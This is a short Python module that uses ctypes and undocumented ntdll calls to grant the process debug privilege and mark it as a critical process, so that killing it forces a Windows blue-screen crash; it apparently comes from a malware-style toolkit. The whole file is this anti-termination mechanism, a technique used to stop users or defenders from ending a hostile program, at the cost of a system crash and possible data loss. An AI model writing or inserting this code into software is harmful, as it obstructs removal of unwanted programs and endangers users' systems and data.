# Import modules

from ctypes import windll, byref, c_bool


# Protect process with BSoD (if killed)

def SetProtection():
 windll.ntdll.RtlAdjustPrivilege(20, 1, 0, byref(c_bool()))
 windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def UnsetProtection():
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0